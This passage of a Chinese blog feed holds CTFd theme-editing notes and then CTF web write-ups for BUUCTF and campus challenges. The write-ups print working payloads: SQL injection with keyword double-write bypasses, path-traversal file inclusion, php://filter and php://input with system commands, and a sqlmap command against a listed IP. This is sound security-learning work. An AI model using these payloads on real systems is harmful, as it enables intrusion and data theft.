class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-4&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;头像&quot;</span> <span class="attr">width</span>=<span class="string">&quot;110&quot;</span> <span class="attr">class</span>=<span class="string">&quot;round_icon img-circle&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">style</span>=<span class="string">&quot;float:left&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 1em; font-weight: bold;&quot;</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-indent: 2em; font-size:medium;&quot;</span>&gt;</span>介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-12&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-col-lg-4&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1>平台的其他优化</h1><h2 id="脚标">脚标</h2><ul><li><p>文件位置<br><code>/root/CTFd/CTFd/themes/core/templates/base.html</code></p></li><li><p>源码：</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221129134704361.png" alt="image-20221129134704361"></p><ul><li><p>效果</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221129134729485.png" alt="image-20221129134729485"></p></li></ul><h2 id="收缩导航栏">收缩导航栏</h2><ul><li><p>文件位置</p><p><code>/root/CTFd/CTFd/themes/core/templates/components/navbar.html</code></p></li><li><p>源码：</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item dropdown&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nav-link dropdown-toggle&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;dropdown&quot;</span> <span class="attr">role</span>=<span class="string">&quot;button&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">aria-haspopup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;true&quot;</span>&gt;</span>GUETSEC<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-menu&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-item&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/links&quot;</span>&gt;</span>团队成员<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-item&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/resources&quot;</span>&gt;</span>荣誉<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-item&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/license&quot;</span>&gt;</span>关于我们<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-item&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/contact&quot;</span>&gt;</span>加入我们<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-item&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.ctfwp.com/&quot;</span>&gt;</span>七星瓢虫工作坊<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>代码插入位置：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927132144571.png" alt="image-20220927132144571"></p><ul><li>效果：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927132220587.png" alt="image-20220927132220587"></p><h2 id="可直接点击的网址">可直接点击的网址</h2><ul><li><p>文件位置</p><p><code>/root/CTFd/CTFd/plugins/ctfd-whale/assets/view.js</code></p></li><li><p>源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;a target=&quot;_ blank&quot; href=&quot;http://&#x27;</span> + response.<span class="property">user_access</span> +<span class="string">&#x27;&quot;&gt;&lt;p class=&quot;card- text&quot;&gt;&#x27;</span> + response.<span class="property">user_access</span> +<span class="string">&#x27;&lt;/p&gt;&#x27;</span> + <span class="string">&#x27;&lt;/a&gt;&#x27;</span>+</span><br></pre></td></tr></table></figure></li><li><p>代码插入位置：</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927132344133.png" alt="image-20220927132344133"></p><ul><li>效果：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927132432236.png" alt="image-20220927132432236"></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-web刷题</title>
      <link href="/posts/44511/"/>
      <url>/posts/44511/</url>
      
        <content type="html"><![CDATA[<blockquote><p>BUUCTF平台的web题，持续刷。</p></blockquote><h2 id="极客大挑战-2019-EasySQL">[极客大挑战 2019]EasySQL</h2><ul><li>题目：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659965485785-6b64d659-c5b2-4c84-a2d6-8adca00fb79f.png" alt="img"></p><ul><li>有登录框，第一联想到利用sql注入，直接尝试万能密码<code>' or '1'='1</code>登录</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659965617560-a5ba0dd4-aa1f-42b2-858c-0228a48d5ff0.png" alt="img"></p><h2 id="HCTF-2018-WarmUp">[HCTF 2018]WarmUp</h2><ul><li>一进去就只有一个滑稽脸，直接查看源码，得到source.php，进去得到源码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659966780771-950e19e1-5821-4413-a295-95f5b8e4e69c.png" alt="img"></p><ul><li>源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>1、代码审计，发现还有一个hint.php，进去后得到<code>flag not here, and flag in ffffllllaaaagggg</code>，那也就是flag在ffffllllaaaagggg里，但是没有具体说明是在那个目录下，因此构造时候需要依次通过…/…/构造尝试，去查看到底是几层的根目录</p><p>2、代码审计，发现是白名单验证，文件包含只能包含source.php和hint.php</p><p>3、根据后面的if条件得知，file不能为空，必须为字符串，还要通过checkfile()函数的检查，才能包含。</p><p>4、其中检查共有三次，第三次要经过url解码</p><p>5、payload：<code>file=source.php%253f/../../../../../../ffffllllaaaagggg</code></p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659967349372-dd08f2da-cd70-4bf1-837d-72ae29d9a6b4.png" alt="img"></p><h2 id="极客大挑战-2019-Havefun">[极客大挑战 2019]Havefun</h2><ul><li>查看源码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659967412083-2a52fb54-ea7b-4b91-afcf-d13ac14f417b.png" alt="img"></p><ul><li>根据源码很容易得到payload：<code>?cat=dog</code></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659967477695-b75a0926-7bd4-4aec-9fd6-dc9ceec4afa0.png" alt="img"></p><h2 id="ACTF2020-新生赛-Include">[ACTF2020 新生赛]Include</h2><ul><li>一上来直接给了一个tips超链接，然后进去得到</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659967617876-e53455d1-be03-490a-9535-2b080959168d.png" alt="img"></p><blockquote><p>观察url发现有flag.php，结合题目判断这题是php伪协议</p><p>payload：<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>把得到的base64字符串进行解码</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659967946632-5f593b96-3985-40fc-b130-d6970949269d.png" alt="img"></p><h2 id="ACTF2020-新生赛-Exec">[ACTF2020 新生赛]Exec</h2><ul><li>发现是一个ping的命令执行，测试一下其他命令是否也能执行，是成功的</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659968049937-11d102a4-aad2-4521-addc-2565f4365f77.png" alt="img"></p><ul><li>那就直接抓取flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1659968097734-9507a5b1-d1c7-4c96-9799-28142ac652c8.png" alt="img"></p><h2 id="极客大挑战-2019-BabySQL">[极客大挑战 2019]BabySQL</h2><ul><li>题目：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660980135444-9e2c836c-0b7b-416a-bec3-448669307193.png" alt="img"></p><ul><li>尝试用admin登录失败</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660980292881-fe4cd226-1a20-4168-b380-81049dd174a2.png" alt="img"></p><ul><li><p>进行sql注入</p></li><li><p>payload：<code>?username=1' order by 3&amp;password=admin</code></p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660980630189-828aecb0-e231-480b-9afe-ae74878e637a.png" alt="img"></p><ul><li><p>可以看到order的or和by均被过滤掉了</p></li><li><p>尝试联合注入</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660980811662-e338fa89-2fa7-4dcf-aba6-7a04c76af288.png" alt="img"></p><blockquote><p>同样union和select也都被过滤掉了</p><p>利用双写绕过，发现有3个字段</p></blockquote><ul><li>payload：<code>?username=' oorrder bbyy 4--+&amp;password=admin</code></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660981906860-fa3011f9-ef66-4488-9a17-60d972a3fd6f.png" alt="img"></p><ul><li><p>回显位为第二个和第三个字段</p></li><li><p>payload：<code>?username=' ununionion seselectlect 1,2,3--+&amp;password=admin</code></p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660982012073-e323a752-31ff-482b-8c78-bb5d7f3cd5d9.png" alt="img"></p><ul><li><p>查所有库</p></li><li><p>payload：<code>?username=' ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) frfromom infoorrmation_schema.schemata)--+&amp;password=admin</code></p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660983995572-138d1d45-29d6-4c8e-8214-3849ec5c205d.png" alt="img"></p><ul><li>查ctf库中的所有表</li><li>payload：<code>?username=' ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='ctf') --+&amp;password=admin</code></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660984181446-440ed3b8-df44-4bd8-bdf6-23ce262e07ee.png" alt="img"></p><ul><li>查Flag表中的所有字段</li><li>payload：<code>?username=' ununionion seselectlect 1,2,(seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='Flag') --+&amp;password=admin</code></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660984384749-570e6518-f223-45f2-9cc9-5ee6d769ad2c.png" alt="img"></p><ul><li>查看flag字段内的内容</li><li>paylaod：<code>?username=' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password=admin</code></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660983468939-228328bb-4756-402f-884b-4a9cfd20a403.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>22年网安小学期-CTF</title>
      <link href="/posts/65465/"/>
      <url>/posts/65465/</url>
      
        <content type="html"><![CDATA[<h1>木册木兰</h1><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656402244227-1535d8a9-9932-489c-af63-b357e1b72be7.png" alt="img"></p><ul><li>下载附件，然后根据提示可以看出就是栅栏密码，所以直接解密得到</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656402270709-22a55c9b-fd6e-4cef-b874-ef8a6146eb6b.png" alt="img"></p><h1>inputer</h1><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656402323639-3d802464-d117-4c8b-99b0-2b5c96c80556.png" alt="img"></p><ul><li>先源码，这里要用到php://伪协议</li><li>直接抓包然后改包，构造<code>php://input</code>，利用<code>system(&quot;ls&quot;);</code>输出当前目录下所包含的文件，发包后发现可利用</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656403524194-775abc02-cd99-402a-8efb-b0be856fd9e6.png" alt="img"></p><ul><li>那就直接用命令<code>&lt;?php system(&quot;cat /flag.txt&quot;);?&gt;</code>获得flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656403931462-65c99e45-585b-4da9-aa67-ebbf7b040faf.png" alt="img"></p><h1>WEB_blind_exec</h1><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656418501152-cffd8b07-e4b3-4c7d-88e9-2af93a200893.png" alt="img"></p><h1>LFI</h1><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656425908372-f0b23cde-7697-4219-a001-09d5cd26f703.png" alt="img"></p><h1>baby_sql</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656463477302-afa6aabf-6cba-40da-a6ab-9c6d651c78ce.png" alt="img"></p><h1>WEB_randnum</h1><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656463743749-0e0e3ae5-1757-4c23-a7d3-04eef75b7ca4.png" alt="img"></p><h1>WEB_babyphp</h1><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656463757900-66e0ad0f-8176-46e7-aade-bff9d0305c50.png" alt="img"></p><h1>easy_getshell</h1><ul><li><a href="https://www.anquanke.com/post/id/212603?from=groupmessage#h2-6">pbot复现</a></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656489800858-4a805906-bd00-402f-b3cb-b4cba8d14c15.png" alt="img"></p><h1>sessionlfi</h1><ul><li>源码中发现页面传参使用get方法，猜测存在sql注入漏洞</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656507098348-a7fb1359-f1d6-48d8-9fae-9f5423965b72.png" alt="img"></p><blockquote><p>测试payload：</p><p>sqlmap -u <a href="http://218.94.60.213:13198/table.php?id=1">http://218.94.60.213:13198/table.php?id=1</a> -dbs</p><p>爆破数据库，共有4个数据库</p></blockquote><p><img 